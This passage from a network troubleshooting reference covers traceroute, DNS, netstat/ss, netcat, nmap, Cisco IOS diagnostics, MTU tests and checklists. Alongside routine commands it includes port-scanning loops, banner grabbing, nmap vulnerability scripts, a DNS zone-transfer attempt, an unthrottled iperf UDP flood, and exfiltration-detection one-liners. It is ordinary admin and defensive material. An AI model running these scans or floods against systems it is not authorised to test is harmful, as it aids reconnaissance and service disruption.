# Linux
traceroute 8.8.8.8                    # Default (UDP probes)
traceroute -I 8.8.8.8                 # ICMP mode (like Windows tracert)
traceroute -T -p 80 8.8.8.8          # TCP mode (port 80, bypasses some firewalls)
traceroute -n 8.8.8.8                 # No hostname resolution (faster)
traceroute -m 30 8.8.8.8             # Max 30 hops (default)
traceroute -w 3 8.8.8.8              # 3-second timeout per hop
traceroute6 2001:4860:4860::8888     # IPv6

# Windows
tracert 8.8.8.8                       # ICMP mode
tracert -d 8.8.8.8                    # No DNS resolution
tracert -h 20 8.8.8.8                # Max 20 hops
tracert -w 2000 8.8.8.8              # 2000ms timeout

# Interpreting output
# * * * = No response from that hop (firewall drops TTL-exceeded, or no response)
# High latency spike = congestion or slow link at that hop
# Asymmetric path = return path different from forward path (normal but confusing)
# Same IP repeated = routing loop
```

### MTR — My Traceroute (Combines ping + traceroute)

```bash
mtr 8.8.8.8                           # Interactive mode
mtr --report 8.8.8.8                  # Report mode (collect then print)
mtr --report --report-cycles 100 8.8.8.8  # 100 probes
mtr -n 8.8.8.8                        # No DNS resolution
mtr --tcp -P 80 8.8.8.8              # TCP mode
mtr --udp -P 53 8.8.8.8              # UDP mode

# MTR columns:
# Loss% - packet loss at that hop
# Snt   - packets sent
# Last  - last RTT
# Avg   - average RTT
# Best  - best RTT
# Wrst  - worst RTT
# StDev - jitter (standard deviation)

# Key insight: if loss% shows at hop 5 but hop 6 is fine → that router just
# deprioritizes ICMP (not a real problem). Only worry if loss continues downstream.
```

### nslookup / dig / host — DNS Queries

```bash
# nslookup (Windows and Linux)
nslookup example.com                   # Basic A lookup
nslookup -type=MX example.com         # MX records
nslookup -type=NS example.com         # Name servers
nslookup -type=ANY example.com        # All records
nslookup example.com 8.8.8.8          # Use specific DNS server
nslookup 93.184.216.34                 # Reverse lookup
# Interactive mode:
nslookup
> set type=MX
> example.com
> server 8.8.8.8
> example.com

# dig (Linux — more detail than nslookup)
dig example.com                        # A record
dig example.com MX                     # MX record
dig example.com NS                     # Name servers
dig example.com SOA                    # SOA record
dig example.com TXT                    # TXT records
dig example.com ANY                    # All records
dig @8.8.8.8 example.com              # Use specific DNS server
dig +short example.com                 # IP only output
dig -x 93.184.216.34                  # Reverse lookup
dig +trace example.com                 # Full resolution trace from root
dig +nocmd +noall +answer example.com  # Clean output
dig +dnssec example.com               # Show DNSSEC records
dig AXFR @ns1.example.com example.com # Zone transfer attempt

# host (simpler than dig)
host example.com
host -t MX example.com
host -t NS example.com
host -a example.com                    # All records
host 93.184.216.34                    # Reverse lookup

# PowerShell
Resolve-DnsName example.com
Resolve-DnsName example.com -Type MX
Resolve-DnsName example.com -Server 8.8.8.8
```

### netstat / ss — Connection Status

```bash
# netstat (older, still widely available)
netstat -an                            # All connections (numeric)
netstat -tulnp                         # TCP/UDP listening ports with process
netstat -tn                            # TCP connections
netstat -un                            # UDP connections
netstat -rn                            # Routing table
netstat -i                             # Interface statistics
netstat -s                             # Protocol statistics (drops, errors)
netstat -c                             # Continuous output
netstat -an | grep ESTABLISHED         # Only established connections
netstat -an | grep LISTEN              # Only listening ports
netstat -an | grep :80                 # Connections on port 80

# Windows netstat
netstat -an                            # All connections
netstat -b                             # Show owning process/executable
netstat -o                             # Show PID
netstat -r                             # Routing table
netstat -e                             # Ethernet statistics
netstat -s                             # Per-protocol statistics

# ss (modern replacement for netstat — faster, more detail)
ss -an                                 # All sockets (numeric)
ss -tulnp                              # TCP/UDP listening with process
ss -tn                                 # TCP connections
ss -un                                 # UDP connections
ss -tp                                 # TCP with process
ss -s                                  # Summary statistics
ss state established                   # Only established
ss state listening                     # Only listening
ss dst 8.8.8.8                        # Connections to specific IP
ss dport = :80                        # Connections to port 80
ss sport = :22                        # Connections from port 22
ss -K dst 192.168.1.100               # Kill connections to IP

# Useful patterns
# Find what's listening on a port
ss -tlnp | grep ':80'
netstat -tlnp | grep ':443'

# Find connections to external IPs (potential exfil)
netstat -an | grep ESTABLISHED | grep -v "127.0.0.1\|::1\|192.168\|10\."

# Count connections per remote IP
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn
```

### ip / ifconfig — Interface Configuration

```bash
# Modern (ip command — preferred)
ip addr show                           # All interfaces and addresses
ip addr show eth0                      # Specific interface
ip link show                           # Link layer info
ip link show eth0
ip route show                          # Routing table
ip route show default                  # Default route only
ip neigh show                          # ARP/neighbor table
ip -6 addr show                        # IPv6 addresses
ip -s link show eth0                   # Interface statistics (packets, bytes, errors)
ip -s -s link show eth0               # More statistics

# Configuration (temporary — lost on reboot)
ip addr add 192.168.1.10/24 dev eth0  # Add IP
ip addr del 192.168.1.10/24 dev eth0  # Remove IP
ip link set eth0 up                    # Enable interface
ip link set eth0 down                  # Disable interface
ip link set eth0 mtu 1500             # Set MTU
ip route add default via 192.168.1.1  # Add default route
ip route add 10.0.0.0/8 via 192.168.1.254  # Add static route
ip route del 10.0.0.0/8               # Delete route
ip neigh flush dev eth0               # Clear ARP cache

# ifconfig (older — still common)
ifconfig                               # All interfaces
ifconfig eth0                          # Specific interface
ifconfig eth0 up                       # Enable
ifconfig eth0 down                     # Disable
ifconfig eth0 192.168.1.10 netmask 255.255.255.0  # Set IP

# Windows
ipconfig                               # Basic IP info
ipconfig /all                          # Full details (MAC, DNS, DHCP server, etc.)
ipconfig /release                      # Release DHCP lease
ipconfig /renew                        # Renew DHCP lease
ipconfig /flushdns                     # Clear DNS cache
ipconfig /displaydns                   # Show DNS cache
ipconfig /registerdns                  # Re-register DNS
```

### arp — ARP Cache Management

```bash
# Linux
arp -a                                 # Show ARP cache (BSD format)
arp -n                                 # Numeric (no hostname resolution)
ip neigh show                          # Modern equivalent
arp -d 192.168.1.100                  # Delete entry
arp -s 192.168.1.100 aa:bb:cc:dd:ee:ff  # Add static entry

# Windows
arp -a                                 # Show ARP cache
arp -a 192.168.1.100                  # Show specific entry
arp -d 192.168.1.100                  # Delete entry
arp -s 192.168.1.100 aa-bb-cc-dd-ee-ff  # Add static (note dash separator on Windows)

# Uses
# Find MAC address of known IP
arp -a | grep 192.168.1.100
# Check for ARP poisoning (two IPs same MAC, or same IP multiple MACs)
arp -a | awk '{print $4}' | sort | uniq -d    # Duplicate MACs
```

### route — Routing Table

```bash
# Linux
route -n                               # Show routing table (numeric)
ip route show                          # Modern equivalent
ip route get 8.8.8.8                  # Find route for specific destination

# Adding routes (temporary)
route add -net 10.0.0.0/8 gw 192.168.1.254
route add default gw 192.168.1.1

# Windows
route print                            # Show routing table
route add 10.0.0.0 mask 255.0.0.0 192.168.1.254   # Add route
route add 10.0.0.0 mask 255.0.0.0 192.168.1.254 -p  # Persistent
route delete 10.0.0.0                  # Delete route

# Find routing issues
ip route get 8.8.8.8                  # What route will be used?
# If this shows an unexpected interface or gateway → routing misconfiguration
```

### nc (netcat) — The Swiss Army Knife

```bash
# Test TCP port connectivity
nc -zv 10.0.0.1 22                    # Test if port 22 is open (-z = scan only)
nc -zv 10.0.0.1 80 443 8080          # Test multiple ports
nc -zvw 3 10.0.0.1 443               # 3-second timeout
for port in 22 80 443 3389; do nc -zv 10.0.0.1 $port 2>&1; done

# Test UDP port
nc -zvu 10.0.0.1 53                   # Test UDP port 53

# Banner grabbing
echo "" | nc -nv 10.0.0.1 80         # HTTP banner
echo "" | nc -nv 10.0.0.1 22         # SSH banner
echo "" | nc -nv 10.0.0.1 25         # SMTP banner

# Simple port listener (for testing connectivity back)
nc -l -p 4444                          # Listen on TCP 4444
nc -lu -p 53                           # Listen on UDP 53

# File transfer
nc -l -p 9999 > received_file.txt     # Receiver
nc 10.0.0.2 9999 < file_to_send.txt  # Sender

# Port scanning without nmap
for port in {1..1024}; do
  nc -zv 10.0.0.1 $port 2>&1 | grep -v refused
done

# Chat (quick test of two-way connectivity)
nc -l -p 4444                          # Server side
nc 10.0.0.1 4444                       # Client side
```

### curl / wget — HTTP Testing

```bash
# curl
curl http://192.168.1.1               # Basic HTTP request
curl -v http://192.168.1.1            # Verbose (show headers)
curl -I http://192.168.1.1            # HEAD only (headers)
curl -k https://192.168.1.1           # Skip SSL verification
curl -L http://192.168.1.1            # Follow redirects
curl -o output.html http://192.168.1.1 # Save to file
curl -w "%{http_code}" http://192.168.1.1  # Just the status code
curl -w "\n%{time_total}s\n" http://192.168.1.1  # Show total time
curl --max-time 5 http://192.168.1.1  # 5-second timeout
curl -u admin:password http://192.168.1.1  # Basic auth
curl -H "Host: example.com" http://192.168.1.1  # Custom host header
curl -H "Authorization: Bearer TOKEN" http://api.example.com/v1/data

# Test DNS resolution separately from HTTP
curl --resolve example.com:80:192.168.1.1 http://example.com

# wget
wget http://192.168.1.1               # Download to file
wget -q --spider http://192.168.1.1   # Check URL without downloading
wget --server-response http://192.168.1.1 -O /dev/null 2>&1  # Show response headers
```

### nmap Quick Reference

```bash
# Discovery
nmap -sn 192.168.1.0/24              # Ping sweep (live hosts)
nmap -Pn 10.0.0.1                    # Skip ping, scan anyway (host may block ICMP)

# Quick scans
nmap 10.0.0.1                         # Top 1000 ports (SYN scan if root)
nmap -F 10.0.0.1                      # Fast scan (top 100 ports)
nmap -p 80,443 10.0.0.1              # Specific ports only

# Detailed scans
nmap -sV 10.0.0.1                     # Service version detection
nmap -O 10.0.0.1                      # OS detection
nmap -A 10.0.0.1                      # Aggressive (all detection + scripts)
nmap -p- 10.0.0.1                     # All 65535 ports

# Show open ports only
nmap 10.0.0.0/24 --open               # Only show open ports
nmap 10.0.0.0/24 --open -oG - | grep "open"  # Grepable open ports

# OS and service fingerprinting
nmap -sV --version-intensity 9 -O 10.0.0.1

# Timing
nmap -T4 10.0.0.1                     # Aggressive timing (fast networks)
nmap --scan-delay 1s 10.0.0.1        # Slow down (avoid rate limiting)

# Script scanning
nmap --script=default 10.0.0.1       # Default safe scripts
nmap --script=vuln 10.0.0.1          # Vulnerability checks
```

### Windows-Specific Tools

```powershell
# PowerShell network commands
Test-NetConnection 8.8.8.8                           # Basic connectivity
Test-NetConnection 8.8.8.8 -Port 443                 # Port test
Test-NetConnection 8.8.8.8 -TraceRoute               # Traceroute
Test-NetConnection 8.8.8.8 -InformationLevel Detailed # Full info

Get-NetIPAddress                                      # All IP addresses
Get-NetIPAddress -AddressFamily IPv4                  # IPv4 only
Get-NetAdapter                                        # Network adapters
Get-NetAdapterStatistics                              # Interface stats
Get-NetRoute                                          # Routing table
Get-NetTCPConnection                                  # TCP connections
Get-NetTCPConnection -State Established               # Established only
Get-NetTCPConnection -LocalPort 443                   # Port 443
Get-NetUDPEndpoint                                    # UDP endpoints

# DNS
Resolve-DnsName example.com
Clear-DnsClientCache                                  # Flush DNS
Get-DnsClientCache                                    # View cache

# Firewall
Get-NetFirewallRule | Where-Object Enabled -eq True   # Enabled rules
Get-NetFirewallRule -DisplayName "Web*"               # Search by name
New-NetFirewallRule -DisplayName "Test" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow

# pathping (Windows — combines ping + tracert with statistics)
pathping 8.8.8.8
pathping -n 8.8.8.8                                   # No DNS resolution
pathping -h 20 8.8.8.8                               # Max 20 hops

# PsPing (Sysinternals — TCP/UDP/ICMP ping)
psping 8.8.8.8                                        # ICMP ping
psping 8.8.8.8:443                                    # TCP ping (measures TCP latency)
psping -u 8.8.8.8:53                                  # UDP ping
psping -l 1000 8.8.8.8                               # 1000-byte payload

# Wireshark on Windows
# netsh trace (built-in packet capture)
netsh trace start capture=yes tracefile=C:\capture.etl
# Do something...
netsh trace stop
# Convert ETL to pcap: Microsoft Network Monitor or Wireshark
```

---

## 12.3 Cisco IOS Troubleshooting Commands

### General Diagnostics

```cisco
! Hardware and system info
Router# show version
Router# show inventory                  ! Physical hardware list
Router# show platform
Router# show environment                ! Temperature, power, fans
Router# show memory statistics          ! Memory usage
Router# show processes cpu              ! CPU utilization
Router# show processes cpu history      ! CPU history graph
Router# show clock                      ! System time

! Configuration comparison
Router# show startup-config            ! Saved config
Router# show running-config            ! Active config
Router# show running-config | section ospf  ! Filter to OSPF section
Router# show running-config interface gi0/0  ! Specific interface config

! Archive and change tracking
Router# show archive log config         ! Recent config changes
```

### Interface Troubleshooting

```cisco
! Quick status check
Router# show ip interface brief
! Column meanings:
! Interface = name
! IP-Address = configured IP (or unassigned)
! OK? = IP stack initialized (usually YES)
! Method = how IP was assigned (manual/DHCP)
! Status = Layer 1: up/administratively down/down
! Protocol = Layer 2: up/down

! Detailed interface info
Router# show interfaces GigabitEthernet0/0
! Key fields to check:
!   GigabitEthernet0/0 is up, line protocol is up ← both should be up
!   Hardware is... (hardware type)
!   Internet address is 192.168.1.1/24
!   MTU 1500 bytes, BW 1000000 Kbit/sec, DLY 10 usec
!   Last input 00:00:02, output 00:00:01  ← when last traffic seen
!   Input queue: 0/75/0/0 (size/max/drops/flushes)
!   5 minute input rate 0 bits/sec, 0 packets/sec
!   0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored
!   0 output errors, 0 collisions, 0 interface resets

! Error indicators:
!   input errors → CRC, frame errors → bad cable, duplex mismatch
!   output drops → outbound congestion (QoS or speed issue)
!   interface resets → keepalive failures, encapsulation issues

Router# show interfaces counters errors  ! Error counters for all interfaces

! Clear counters (reset statistics)
Router# clear counters GigabitEthernet0/0

! CDP neighbor verification
Router# show cdp neighbors              ! Summary of connected Cisco devices
Router# show cdp neighbors detail       ! Full details (IPs, IOS version)
Router# show cdp entry R2               ! Info about specific neighbor

! LLDP (open standard)
Router# show lldp neighbors
Router# show lldp neighbors detail
```

### Layer 2 Troubleshooting

```cisco
! ARP table
Router# show arp
Router# show ip arp                    ! Same
Router# show ip arp 192.168.1.100     ! Specific host
Router# clear arp-cache               ! Clear ARP table

! MAC address table (switch)
Switch# show mac address-table
Switch# show mac address-table dynamic                 ! Dynamic entries only
Switch# show mac address-table vlan 10                ! Specific VLAN
Switch# show mac address-table address aa:bb:cc:dd:ee:ff
Switch# show mac address-table interface fa0/1        ! Entries for interface
Switch# clear mac address-table dynamic               ! Clear dynamic entries

! VLAN troubleshooting
Switch# show vlan brief
Switch# show vlan id 10
Switch# show interfaces FastEthernet0/1 switchport
!   Administrative Mode: static access OR trunk
!   Operational Mode: static access OR trunk
!   Access Mode VLAN: 10
!   Trunking Native Mode VLAN: 1

Switch# show interfaces trunk
!   Port  Mode  Encapsulation  Status   Native vlan
!   Gi0/1 on    802.1q         trunking 1

! STP troubleshooting
Switch# show spanning-tree
Switch# show spanning-tree vlan 10
!   Root ID: priority, MAC, Cost, Port
!   Bridge ID: priority, MAC
!   Interface Role Sts Cost Prio.Nbr Type
!   Gi0/1   Root FWD 4    128.1   P2p
!   Gi0/2   Desg FWD 4    128.2   P2p
!   Fa0/10  Altn BLK 19   128.10  P2p  ← This port is blocking

Switch# show spanning-tree blockedports
Switch# show spanning-tree inconsistentports  ! Root guard or BPDU guard issues
Switch# show spanning-tree detail             ! Detailed info with timers
```

### Layer 3 Troubleshooting

```cisco
! Routing table
Router# show ip route
Router# show ip route 10.0.0.0             ! Route for specific destination
Router# show ip route 10.0.0.0 255.255.255.0  ! Exact match
Router# show ip route connected            ! Connected routes only
Router# show ip route static              ! Static routes only
Router# show ip route ospf               ! OSPF routes only
Router# show ip route eigrp              ! EIGRP routes only
Router# show ip route summary            ! Route count by type

! Test routing decision
Router# show ip route 8.8.8.8            ! Which route would be used?

! OSPF
Router# show ip ospf                      ! OSPF process info
Router# show ip ospf neighbor            ! Neighbor table — should show FULL
Router# show ip ospf neighbor detail     ! Detailed neighbor info
Router# show ip ospf database           ! LSDB — all LSAs
Router# show ip ospf database router    ! Type 1 LSAs
Router# show ip ospf database network   ! Type 2 LSAs (DR-generated)
Router# show ip ospf database summary   ! Type 3 LSAs (ABR-generated)
Router# show ip ospf database external  ! Type 5 LSAs (redistributed)
Router# show ip ospf interface          ! OSPF config on each interface
Router# show ip ospf interface gi0/0    ! Specific interface
!   Key: Hello/Dead interval, DR/BDR, Cost, State

! OSPF neighbor state should be FULL (or 2-WAY for DROthers)
! If stuck at EXSTART/EXCHANGE: MTU mismatch
! If stuck at 2-WAY: DR/BDR election only (DROthers are in 2-way with each other)
! If stuck at LOADING: LSDB sync issue

! EIGRP
Router# show ip eigrp neighbors
Router# show ip eigrp topology           ! Topology table (successor + FSs)
Router# show ip eigrp topology all-links ! All paths including those not meeting FC
Router# show ip eigrp interfaces         ! EIGRP-enabled interfaces
Router# show ip eigrp traffic            ! Packet counts

! BGP
Router# show bgp summary                 ! Neighbor table with state
Router# show bgp                         ! Full BGP table
Router# show bgp 192.168.0.0            ! Specific prefix info (best path shown)
Router# show bgp neighbors              ! Detailed neighbor info
Router# show bgp neighbors 203.0.113.2 advertised-routes
Router# show bgp neighbors 203.0.113.2 received-routes
Router# show bgp neighbors 203.0.113.2 routes  ! Routes actually installed from this peer

! BGP neighbor states:
! Idle → Active → Connect → OpenSent → OpenConfirm → Established
! Should be Established for working BGP session
```

### Ping and Traceroute (Cisco)

```cisco
! Standard ping
Router# ping 192.168.1.1
Router# ping 192.168.1.1 repeat 100      ! 100 packets
Router# ping 192.168.1.1 size 1500       ! Large packet
Router# ping 192.168.1.1 timeout 2       ! 2-second timeout
Router# ping 192.168.1.1 source gi0/0    ! From specific interface

! Extended ping (interactive)
Router# ping
Protocol [ip]: ip
Target IP address: 192.168.1.1
Repeat count [5]: 100
Datagram size [100]: 1472
Timeout in seconds [2]: 2
Extended commands [n]: y
Source address or interface: GigabitEthernet0/0
Type of service [0]:
Set DF bit in IP header? [no]: yes        ! Test MTU
...

! Traceroute
Router# traceroute 8.8.8.8
Router# traceroute 8.8.8.8 source Loopback0
Router# traceroute 8.8.8.8 probe 5       ! 5 probes per hop (default 3)
Router# traceroute 8.8.8.8 ttl 1 10     ! Only show hops 1-10
```

### Debug Commands

> ⚠️ Use debug carefully in production — can cause high CPU and console spam.

```cisco
! Always check CPU first
Router# show processes cpu | exclude 0.00%__0.00%__0.00%

! Limit debug output (only to this terminal, not all)
Router# terminal monitor               ! See debug on vty (already on if console)
Router# no terminal monitor           ! Stop seeing syslog on vty

! OSPF debugging
Router# debug ip ospf hello            ! Hello packets
Router# debug ip ospf adj             ! Adjacency events
Router# debug ip ospf events          ! All OSPF events

! EIGRP debugging
Router# debug eigrp packets           ! All EIGRP packets
Router# debug eigrp neighbors         ! Neighbor events
Router# debug ip eigrp                ! EIGRP events

! Routing debugging
Router# debug ip routing              ! Route table changes

! NAT debugging
Router# debug ip nat                  ! NAT translations
Router# debug ip nat detailed         ! More detail

! ALWAYS turn off debug when done:
Router# undebug all
Router# no debug all
Router# u all                         ! Shorthand
```

---

## 12.4 Common Network Problems and Solutions

### Physical Layer (Layer 1) Issues

| Symptom | Likely Cause | Solution |
|---------|-------------|---------|
| Interface down/down | No cable or broken cable | Check cable, try different cable |
| Interface up/down | Layer 2 issue (duplex, STP) | Check duplex/speed, STP |
| Admin down | `shutdown` command | `no shutdown` |
| High CRC errors | Bad cable, connector, EMI | Replace cable, re-crimp connector |
| High input errors | Duplex mismatch | Force same duplex on both ends |
| Interface flapping | Intermittent cable/NIC issue | Check cable, NIC, SFP |
| No link light | Cable wrong, no power | Check cable type, power |
| Short range on fiber | Dirty connector | Clean with fiber cleaning tool |
| No link on fiber | Wrong duplex fiber (TX-TX) | Flip fiber pair |

### Layer 2 Issues

| Symptom | Likely Cause | Solution |
|---------|-------------|---------|
| No communication between same subnet | VLAN misconfiguration | Check access VLAN on both ports |
| Trunk not passing all VLANs | Trunk allowed VLAN list | Check `show interfaces trunk` |
| STP blocking needed port | Wrong root bridge | Adjust priority; check STP |
| Broadcast storm | Loop in network | Enable STP; check for duplicate links |
| Slow network, high CPU on switch | MAC flood attack | Enable port security |
| DHCP not working | Rogue DHCP or snooping issue | Check DHCP snooping trust ports |
| Native VLAN mismatch | Different native VLANs on trunk | Make native VLAN same on both sides |

### Layer 3 Issues

| Symptom | Likely Cause | Solution |
|---------|-------------|---------|
| Can't ping default gateway | No IP, wrong IP, wrong subnet | Check `show ip int brief` |
| Can ping gateway, not internet | No default route on router | Add `ip route 0.0.0.0 0.0.0.0 ISP-IP` |
| Can't ping across routers | Missing route | Check routing table; add static/dynamic |
| Routing not converging | Routing protocol misconfigured | Check neighbors, authentication, timers |
| Asymmetric routing | Multiple paths, different routes | Check routing metrics; use route policy |
| Duplicate IP address | IP conflict | `arp -a` to find conflicting MAC |
| Wrong subnet mask | IP in different network | Correct subnet mask on both devices |
| OSPF not forming | Area/timer/auth mismatch | Check `show ip ospf interface` on both |
| Route not in table | Network statement wrong | Check wildcard mask in OSPF/EIGRP |

### Application Layer Issues

| Symptom | Likely Cause | Solution |
|---------|-------------|---------|
| DNS not resolving | Wrong DNS server, server down | `dig @8.8.8.8 example.com` to test |
| DHCP not getting IP | DHCP server down, pool exhausted | Check `show ip dhcp binding` |
| Can ping IP, not hostname | DNS misconfiguration | Check `/etc/resolv.conf` or Windows DNS |
| Slow web browsing | High latency, DNS slow | Test with `curl -w "%{time_total}"` |
| Can connect, no data | Firewall blocking return traffic | Check stateful firewall rules |
| SSH not connecting | Wrong port, host-based firewall | `nc -zv host 22` to test |
| Certificate errors | Self-signed, expired cert | Check cert expiry; add CA to trust store |

### MTU and Fragmentation Issues

```bash
# Test path MTU (common issue with VPNs, tunnels, MPLS)
ping -s 1472 -M do 8.8.8.8   # Linux (1472 + 28 header = 1500)
ping -l 1472 -f 8.8.8.8      # Windows

# If 1472 fails, try smaller:
ping -s 1400 -M do 8.8.8.8   # Still 1500 MTU? No — works → MTU between 1428-1500

# Binary search for MTU
# Start: 1472 (fail) → 1400 (fail) → 1200 (pass) → 1300 (pass) → 1350 (pass) → 1400 (fail) → 1380 ...

# Common MTU values:
# 1500 = Standard Ethernet
# 1480 = PPPoE (1500 - 8 byte PPPoE header - 20 byte IP - 8 byte UDP = ~1440 for VPN)
# 1440 = Standard VPN over Ethernet
# 1400 = Double encapsulation (VPN over PPPoE)
# 9000 = Jumbo frames (datacenter)

# On Cisco router, set MTU
Router(config-if)# ip mtu 1400                ! IP MTU (fragmentation threshold)
Router(config-if)# mtu 1500                   ! Physical MTU

# TCP MSS clamping (prevents TCP black hole — fragments TCP at SYN)
Router(config-if)# ip tcp adjust-mss 1452     ! Sets TCP MSS to avoid fragmentation
```

---

## 12.5 Network Performance Analysis

### Bandwidth Testing

```bash
# iperf3 — measure bandwidth between two hosts
# Server side:
iperf3 -s                              # Listen on port 5201

# Client side:
iperf3 -c 192.168.1.100               # TCP bandwidth test
iperf3 -c 192.168.1.100 -t 30         # 30-second test
iperf3 -c 192.168.1.100 -P 4         # 4 parallel streams (saturate link)
iperf3 -c 192.168.1.100 -u -b 100M  # UDP test at 100 Mbps
iperf3 -c 192.168.1.100 -R           # Reverse (server sends to client)
iperf3 -c 192.168.1.100 -b 0 -u     # Unlimited bandwidth UDP flood

# nuttcp (alternative bandwidth tester)
nuttcp -S                              # Server mode
nuttcp 192.168.1.100                  # Test to server

# speedtest-cli (Internet speed test)
pip install speedtest-cli
speedtest-cli
speedtest-cli --simple
speedtest-cli --share                  # Share link

# curl download test
curl -o /dev/null https://speed.cloudflare.com/__down?bytes=100000000
```

### Latency and Jitter Analysis

```bash
# Measure jitter (variation in ping RTT)
ping -c 100 -i 0.1 8.8.8.8 | tail -2

# Parse RTT values
ping -c 100 8.8.8.8 | awk -F'/' 'END {print "avg=" $5 " max=" $6 " jitter=" $7}'

# Measure one-way latency (requires synchronized clocks)
# Use traceroute with timestamps

# Qperf (latency and bandwidth for network fabrics)
qperf                                  # Server
qperf 192.168.1.100 tcp_lat           # TCP latency
qperf 192.168.1.100 udp_lat           # UDP latency
qperf 192.168.1.100 tcp_bw            # TCP bandwidth

# Check for QoS issues
# High jitter + packet loss + latency → likely congestion
# Check interface for drops:
Router# show interfaces gi0/0 | include drops|output queue
# Output queue drops = congestion; QoS needed
```

### Interface Statistics Analysis

```bash
# Linux interface stats (detailed)
ip -s link show eth0
cat /proc/net/dev                      # All interface stats
ethtool -S eth0                        # Detailed NIC statistics

# Watch real-time (update every second)
watch -n 1 "cat /proc/net/dev"
watch -n 1 "ip -s link show eth0"

# iftop — real-time bandwidth by connection
iftop -i eth0                          # Interactive (press h for help)
iftop -i eth0 -n                       # No DNS resolution

# nload — real-time bandwidth by interface
nload eth0

# vnstat — historical bandwidth statistics
vnstat -i eth0                         # Summary
vnstat -i eth0 -h                      # By hour
vnstat -i eth0 -d                      # By day
vnstat -i eth0 -m                      # By month

# nethogs — bandwidth per process
nethogs eth0

# Cisco interface statistics
Router# show interfaces counters        ! Packet/byte counters
Router# show interfaces GigabitEthernet0/0 | include rate
! 5 minute input rate 23456 bits/sec, 15 packets/sec
! 5 minute output rate 45678 bits/sec, 30 packets/sec
```

---

## 12.6 Troubleshooting Checklists

### New Network Not Working

```
□ Check physical connections (cables, lights)
□ Verify IP address, subnet mask, default gateway (show ip int brief / ipconfig /all)
□ Ping default gateway (verifies Layer 3 on local segment)
□ Ping a known external IP (8.8.8.8) — verifies routing/internet
□ Ping by hostname — verifies DNS
□ Check for firewall blocks (try disabling temporarily to test)
□ Verify VLAN assignment if on managed switch
□ Check routing table for correct routes
□ Verify NAT if behind router
```

### OSPF Neighbor Not Forming

```
□ Layer 1/2 working? (can ping neighbor's IP?)
□ Same area ID on both sides? (show ip ospf interface)
□ Same Hello/Dead intervals? (default: 10/40 on broadcast, 30/120 on point-to-point)
□ Same subnet and mask on both interfaces?
□ Same MTU? (check and disable MTU mismatch check if needed: ip ospf mtu-ignore)
□ Same authentication? (key, type)
□ Same stub flags?
□ OSPF process running? (show ip ospf)
□ ACL blocking multicast 224.0.0.5?
□ Duplicate Router IDs? (show ip ospf | include Router ID)
```

### DHCP Not Working

```
□ DHCP server running and reachable?
□ IP pool not exhausted? (show ip dhcp pool / show ip dhcp binding)
□ DHCP relay configured if server on different subnet? (ip helper-address)
□ Relay agent sending to correct DHCP server IP?
□ Firewall blocking UDP 67/68?
□ DHCP snooping blocking request? (check trust port configuration)
□ Correct pool/scope for client's subnet?
□ Client's NIC functioning? (manually assign IP — does that work?)
□ Conflict with statically-assigned IPs in DHCP range?
```

### VPN Not Connecting (IPsec)

```
□ Can reach peer IP? (ping peer IP)
□ IKE Phase 1 — policies match? (encryption, hash, auth method, DH group, lifetime)
□ Pre-shared keys match exactly? (case-sensitive)
□ Firewall allowing UDP 500, UDP 4500 (NAT-T), ESP (protocol 50)?
□ show crypto isakmp sa — should show QM_IDLE (active)
□ IKE Phase 2 — transform sets match? (ESP encryption, auth)
□ Interesting traffic ACLs matching on both sides (mirror of each other)?
□ NAT exemption configured for VPN traffic?
□ PFS mismatch?
□ debug crypto isakmp / debug crypto ipsec for detailed info
```

---
